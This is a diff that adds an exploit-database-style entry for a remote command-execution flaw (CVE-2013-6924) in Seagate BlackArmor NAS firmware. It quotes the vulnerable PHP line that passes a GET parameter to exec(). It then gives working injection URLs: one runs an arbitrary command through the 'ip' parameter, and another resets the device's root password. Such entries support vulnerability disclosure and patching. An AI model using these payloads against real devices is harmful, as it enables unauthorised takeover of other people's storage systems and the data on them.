@@ -1,0 +1,65 @@
+# Exploit Title: Seagate BlackArmor NAS - Remote Command Execution
+
+# Google Dork: N/A
+
+# Date: 04-01-2014
+
+# Exploit Author: Jeroen - IT Nerdbox
+
+# Vendor Homepage:  <http://www.seagate.com/> http://www.seagate.com/
+
+# Software Link:
+<http://www.seagate.com/support/downloads/item/banas-220-firmware-master-dl/
+>
+http://www.seagate.com/support/downloads/item/banas-220-firmware-master-dl/
+
+# Version: sg2000-2000.1331
+
+# Tested on: N/A
+
+# CVE : CVE-2013-6924
+
+#
+
+## Description:
+
+#
+
+# The file getAlias.php located in /backupmgt has the following lines:
+
+#
+
+# $ipAddress = $_GET["ip";
+
+# if ($ipAddress != "") {
+
+#    exec("grep -I $ipAddress $immedLogFile > aliasHistory.txt");
+
+#    ..
+
+#    ..
+
+# }
+
+#
+
+# The GET parameter can easily be manipulated to execute commands on the
+BlackArmor system.
+
+#
+
+## Proof of Concept:
+
+#
+
+# http(s)://<ip | host>/backupmgt/getAlias.php?ip=xx /etc/passwd; <your
+command here>;
+
+#
+
+## Example to change the root password to 'mypassword':
+
+#
+
+# http(s)://<ip | host>/backupmgt/getAlias.php?ip=xx /etc/passwd; echo
+'mypassword' | passwd --stdin;
